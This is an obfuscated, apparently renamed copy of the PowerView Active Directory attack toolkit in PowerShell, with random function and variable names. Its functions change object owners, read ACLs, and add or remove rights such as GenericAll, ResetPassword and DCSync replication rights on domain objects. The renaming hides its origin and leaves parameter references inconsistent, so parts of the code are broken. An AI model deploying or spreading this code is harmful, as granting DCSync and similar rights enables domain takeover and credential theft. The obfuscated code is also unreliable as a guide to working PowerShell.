    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        $hr9yAtexBc9nAwj = ensnared @SearcherArguments -MhNmgElNMTxhWpJ $ZoxCdvQJJjqDiLQ -wDpWXLYTGZrAWN9 objectsid | Select-Object -ExpandProperty objectsid
        if ($hr9yAtexBc9nAwj) {
            $pGERwgaRocjDLFl = [System.Security.Principal.SecurityIdentifier]$hr9yAtexBc9nAwj
        }
        else {
            Write-Warning "[storms] Error parsing owner identity '$ZoxCdvQJJjqDiLQ'"
        }
    }

    PROCESS {
        if ($pGERwgaRocjDLFl) {
            $tHAcROQOWB9HdRG['Raw'] = $True
            $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ


            $RXXAxS9GGVaCDwq = ensnared @SearcherArguments

            ForEach ($Object in $RXXAxS9GGVaCDwq) {
                try {
                    Write-Verbose "[storms] Attempting to set the owner for '$MhNmgElNMTxhWpJ' to '$ZoxCdvQJJjqDiLQ'"
                    $Entry = $RXXAxS9GGVaCDwq.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                    $Entry.PsBase.ObjectSecurity.SetOwner($pGERwgaRocjDLFl)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[storms] Error setting owner: $_"
                }
            }
        }
    }
}


function software {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [Switch]
        $Sacl,

        [Switch]
        $xcptq9LuQME9Mev,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $u9wr9kwnhGApTOf,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $tHAcROQOWB9HdRG['SecurityMasks'] = 'Sacl'
        }
        else {
            $tHAcROQOWB9HdRG['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $NenCdilaMvVXuzG = cackles @SearcherArguments

        $OIQdQWUrPtJUQos = @{}
        if ($PSBoundParameters['Domain']) { $OIQdQWUrPtJUQos['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $OIQdQWUrPtJUQos['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['ResultPageSize']) { $OIQdQWUrPtJUQos['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $OIQdQWUrPtJUQos['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Credential']) { $OIQdQWUrPtJUQos['Credential'] = $szvFVWkPJummdcf }


        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = inhabitable @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($NenCdilaMvVXuzG) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^S-1-.*') {
                    $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                }
                elseif ($isYmprKvwrxUsJW -match '^(CN|OU|DC)=.*') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[software] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $NenCdilaMvVXuzG = cackles @SearcherArguments
                        if (-not $NenCdilaMvVXuzG) {
                            Write-Warning "[software] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                }
                elseif ($isYmprKvwrxUsJW.Contains('.')) {
                    $9pNjjurFRb9jpSJ += "(|(samAccountName=$isYmprKvwrxUsJW)(name=$isYmprKvwrxUsJW)(dnshostname=$isYmprKvwrxUsJW))"
                }
                else {
                    $9pNjjurFRb9jpSJ += "(|(samAccountName=$isYmprKvwrxUsJW)(name=$isYmprKvwrxUsJW)(displayname=$isYmprKvwrxUsJW))"
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[software] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }

            if ($9QyouHvxMZKCIKN) {
                $NenCdilaMvVXuzG.filter = "(&$9QyouHvxMZKCIKN)"
            }
            Write-Verbose "[software] software filter string: $($NenCdilaMvVXuzG.filter)"

            $xSLNEIXByfNTAdG = $NenCdilaMvVXuzG.FindAll()
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $BwJjYSLSjCOa9Mo = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $BwJjYSLSjCOa9Mo = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $RfduuynPUKioieX = Switch ($u9wr9kwnhGApTOf) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $RfduuynPUKioieX) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $BwJjYSLSjCOa9Mo
                                $NwhwPVNCzqVhTgv = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $BwJjYSLSjCOa9Mo
                            $NwhwPVNCzqVhTgv = $True
                        }

                        if ($NwhwPVNCzqVhTgv) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {

                                $UEX9SdoAneuvnNv = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $UEX9SdoAneuvnNv[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $UEX9SdoAneuvnNv[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $UEX9SdoAneuvnNv[$_.Name] = $_.Value
                                    }
                                }
                                $OGWOXGifPGDUhtd = New-Object -TypeName PSObject -Property $UEX9SdoAneuvnNv
                                $OGWOXGifPGDUhtd.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OGWOXGifPGDUhtd
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[software] Error: $_"
                }
            }
        }
    }
}


function enforcers {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $SAjI9PErqJp9HkG,

        [ValidateNotNullOrEmpty()]
        [String]
        $rT9EZJuWEfY9rVY,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $qZI99A9W9FSQiK9,

        [ValidateNotNullOrEmpty()]
        [String]
        $HeCAjNQGUtuycCI,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YxMST9VEDlAAqCt,

        [ValidateNotNullOrEmpty()]
        [String]
        $pZeHqwNBkdbvvev,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $BXym9Ger9NaFpNU = 'All',

        [Guid]
        $FKMOVOlKSwyZSEf
    )

    BEGIN {
        $VJkNbBiZbDoYOuV = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $VJkNbBiZbDoYOuV['Domain'] = $rT9EZJuWEfY9rVY }
        if ($PSBoundParameters['TargetLDAPFilter']) { $VJkNbBiZbDoYOuV['LDAPFilter'] = $qZI99A9W9FSQiK9 }
        if ($PSBoundParameters['TargetSearchBase']) { $VJkNbBiZbDoYOuV['SearchBase'] = $HeCAjNQGUtuycCI }
        if ($PSBoundParameters['Server']) { $VJkNbBiZbDoYOuV['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $VJkNbBiZbDoYOuV['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $VJkNbBiZbDoYOuV['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $VJkNbBiZbDoYOuV['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $VJkNbBiZbDoYOuV['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $VJkNbBiZbDoYOuV['Credential'] = $szvFVWkPJummdcf }

        $PgAtlKERfocLeNx = @{
            'Identity' = $YxMST9VEDlAAqCt
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PgAtlKERfocLeNx['Domain'] = $pZeHqwNBkdbvvev }
        if ($PSBoundParameters['Server']) { $PgAtlKERfocLeNx['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $PgAtlKERfocLeNx['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $PgAtlKERfocLeNx['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $PgAtlKERfocLeNx['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $PgAtlKERfocLeNx['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $PgAtlKERfocLeNx['Credential'] = $szvFVWkPJummdcf }
        $yJKJS9l9YpcpvqZ = ensnared @PrincipalSearcherArguments
        if (-not $yJKJS9l9YpcpvqZ) {
            throw "Unable to resolve principal: $YxMST9VEDlAAqCt"
        }
    }

    PROCESS {
        $VJkNbBiZbDoYOuV['Identity'] = $SAjI9PErqJp9HkG
        $bgPMYnvF9TZyjNS = ensnared @TargetSearcherArguments

        ForEach ($DtaxsoUYgs9jTDU in $bgPMYnvF9TZyjNS) {

            $rcpYmma9oSyTPB9 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $GXsOEXmEUKENKgK = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($FKMOVOlKSwyZSEf) {
                $GUIDs = @($FKMOVOlKSwyZSEf)
            }
            else {
                $GUIDs = Switch ($BXym9Ger9NaFpNU) {

                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }

                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }




                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($oTmGEasQOGoESlU in $yJKJS9l9YpcpvqZ) {
                Write-Verbose "[enforcers] Granting principal $($oTmGEasQOGoESlU.distinguishedname) '$BXym9Ger9NaFpNU' on $($DtaxsoUYgs9jTDU.Properties.distinguishedname)"

                try {
                    $MhNmgElNMTxhWpJ = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$oTmGEasQOGoESlU.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $UXmRPSCBsnF9hRu = New-Object Guid $GUID
                            $NMPguKZhzUJPqlI = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MhNmgElNMTxhWpJ, $NMPguKZhzUJPqlI, $GXsOEXmEUKENKgK, $UXmRPSCBsnF9hRu, $rcpYmma9oSyTPB9
                        }
                    }
                    else {

                        $NMPguKZhzUJPqlI = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MhNmgElNMTxhWpJ, $NMPguKZhzUJPqlI, $GXsOEXmEUKENKgK, $rcpYmma9oSyTPB9
                    }


                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[enforcers] Granting principal $($oTmGEasQOGoESlU.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($DtaxsoUYgs9jTDU.Properties.distinguishedname)"
                        $9ZeK9ueHFhjqYXm = $DtaxsoUYgs9jTDU.GetDirectoryEntry()
                        $9ZeK9ueHFhjqYXm.PsBase.Options.SecurityMasks = 'Dacl'
                        $9ZeK9ueHFhjqYXm.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $9ZeK9ueHFhjqYXm.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[enforcers] Error granting principal $($oTmGEasQOGoESlU.distinguishedname) '$BXym9Ger9NaFpNU' on $($DtaxsoUYgs9jTDU.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function bootblacks {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $SAjI9PErqJp9HkG,

        [ValidateNotNullOrEmpty()]
        [String]
        $rT9EZJuWEfY9rVY,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $qZI99A9W9FSQiK9,

        [ValidateNotNullOrEmpty()]
        [String]
        $HeCAjNQGUtuycCI,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YxMST9VEDlAAqCt,

        [ValidateNotNullOrEmpty()]
        [String]
        $pZeHqwNBkdbvvev,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $BXym9Ger9NaFpNU = 'All',

        [Guid]
        $FKMOVOlKSwyZSEf
    )

    BEGIN {
        $VJkNbBiZbDoYOuV = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $VJkNbBiZbDoYOuV['Domain'] = $rT9EZJuWEfY9rVY }
        if ($PSBoundParameters['TargetLDAPFilter']) { $VJkNbBiZbDoYOuV['LDAPFilter'] = $qZI99A9W9FSQiK9 }
        if ($PSBoundParameters['TargetSearchBase']) { $VJkNbBiZbDoYOuV['SearchBase'] = $HeCAjNQGUtuycCI }
        if ($PSBoundParameters['Server']) { $VJkNbBiZbDoYOuV['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $VJkNbBiZbDoYOuV['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $VJkNbBiZbDoYOuV['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $VJkNbBiZbDoYOuV['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $VJkNbBiZbDoYOuV['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $VJkNbBiZbDoYOuV['Credential'] = $szvFVWkPJummdcf }

        $PgAtlKERfocLeNx = @{
            'Identity' = $YxMST9VEDlAAqCt
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PgAtlKERfocLeNx['Domain'] = $pZeHqwNBkdbvvev }
        if ($PSBoundParameters['Server']) { $PgAtlKERfocLeNx['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $PgAtlKERfocLeNx['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $PgAtlKERfocLeNx['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $PgAtlKERfocLeNx['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $PgAtlKERfocLeNx['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $PgAtlKERfocLeNx['Credential'] = $szvFVWkPJummdcf }
        $yJKJS9l9YpcpvqZ = ensnared @PrincipalSearcherArguments
        if (-not $yJKJS9l9YpcpvqZ) {
            throw "Unable to resolve principal: $YxMST9VEDlAAqCt"
        }
    }

    PROCESS {
        $VJkNbBiZbDoYOuV['Identity'] = $SAjI9PErqJp9HkG
        $bgPMYnvF9TZyjNS = ensnared @TargetSearcherArguments

        ForEach ($DtaxsoUYgs9jTDU in $bgPMYnvF9TZyjNS) {

            $rcpYmma9oSyTPB9 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $GXsOEXmEUKENKgK = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($FKMOVOlKSwyZSEf) {
                $GUIDs = @($FKMOVOlKSwyZSEf)
            }
            else {
                $GUIDs = Switch ($BXym9Ger9NaFpNU) {

                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }

                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }




                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($oTmGEasQOGoESlU in $yJKJS9l9YpcpvqZ) {
                Write-Verbose "[bootblacks] Removing principal $($oTmGEasQOGoESlU.distinguishedname) '$BXym9Ger9NaFpNU' from $($DtaxsoUYgs9jTDU.Properties.distinguishedname)"

                try {
                    $MhNmgElNMTxhWpJ = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$oTmGEasQOGoESlU.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $UXmRPSCBsnF9hRu = New-Object Guid $GUID
                            $NMPguKZhzUJPqlI = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MhNmgElNMTxhWpJ, $NMPguKZhzUJPqlI, $GXsOEXmEUKENKgK, $UXmRPSCBsnF9hRu, $rcpYmma9oSyTPB9
                        }
                    }
                    else {

                        $NMPguKZhzUJPqlI = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MhNmgElNMTxhWpJ, $NMPguKZhzUJPqlI, $GXsOEXmEUKENKgK, $rcpYmma9oSyTPB9
                    }


                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[bootblacks] Granting principal $($oTmGEasQOGoESlU.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($DtaxsoUYgs9jTDU.Properties.distinguishedname)"
                        $9ZeK9ueHFhjqYXm = $DtaxsoUYgs9jTDU.GetDirectoryEntry()
                        $9ZeK9ueHFhjqYXm.PsBase.Options.SecurityMasks = 'Dacl'
                        $9ZeK9ueHFhjqYXm.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $9ZeK9ueHFhjqYXm.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[bootblacks] Error removing principal $($oTmGEasQOGoESlU.distinguishedname) '$BXym9Ger9NaFpNU' from $($DtaxsoUYgs9jTDU.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function rumble {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $pkMxgDCVHqOym9m,

        [Switch]
        $xcptq9LuQME9Mev,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $u9wr9kwnhGApTOf,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MSR9yzCM9HFBXpC = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $MSR9yzCM9HFBXpC['ResolveGUIDs'] = $xcptq9LuQME9Mev }
        if ($PSBoundParameters['RightsFilter']) { $MSR9yzCM9HFBXpC['RightsFilter'] = $u9wr9kwnhGApTOf }
        if ($PSBoundParameters['LDAPFilter']) { $MSR9yzCM9HFBXpC['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $MSR9yzCM9HFBXpC['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $MSR9yzCM9HFBXpC['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $MSR9yzCM9HFBXpC['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $MSR9yzCM9HFBXpC['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $MSR9yzCM9HFBXpC['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $MSR9yzCM9HFBXpC['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $MSR9yzCM9HFBXpC['Credential'] = $szvFVWkPJummdcf }

        $NVVHymkRBXaCUZf = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $NVVHymkRBXaCUZf['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $NVVHymkRBXaCUZf['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $NVVHymkRBXaCUZf['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $NVVHymkRBXaCUZf['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $NVVHymkRBXaCUZf['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $NVVHymkRBXaCUZf['Credential'] = $szvFVWkPJummdcf }

        $kjrB9uCaUhqSpoz = @{}
        if ($PSBoundParameters['Server']) { $kjrB9uCaUhqSpoz['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $kjrB9uCaUhqSpoz['Credential'] = $szvFVWkPJummdcf }


        $qXZSWJBK9oWXBpP = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $MSR9yzCM9HFBXpC['Domain'] = $pkMxgDCVHqOym9m
            $kjrB9uCaUhqSpoz['Domain'] = $pkMxgDCVHqOym9m
        }

        software @ACLArguments | ForEach-Object {

